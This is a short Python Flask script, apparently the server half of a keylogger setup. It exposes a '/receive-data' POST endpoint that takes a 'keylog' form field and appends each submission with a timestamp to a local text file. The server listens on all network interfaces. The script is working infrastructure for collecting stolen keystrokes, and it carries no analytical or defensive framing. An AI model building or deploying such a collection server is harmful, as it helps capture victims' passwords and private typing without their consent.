from flask import Flask, request
import os
import socket
import datetime

app = Flask(__name__)

@app.route('/receive-data', methods=['POST'])
def receive_data():
    keylog_data = request.form.get('keylog')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('received_keylog.txt', 'a') as file:
        file.write(f"{timestamp} {keylog_data}\n")
    print("Data received and stored successfully")
    return "Data received and stored successfully"

if __name__ == "__main__":
    # Get local IP address
    host = socket.gethostbyname(socket.gethostname())
    port = 5000
    print(f"Server running on http://{host}:{port}")
    
    # Run Flask server on localhost (same device) with port 5000
    app.run(host='0.0.0.0', port=5000)
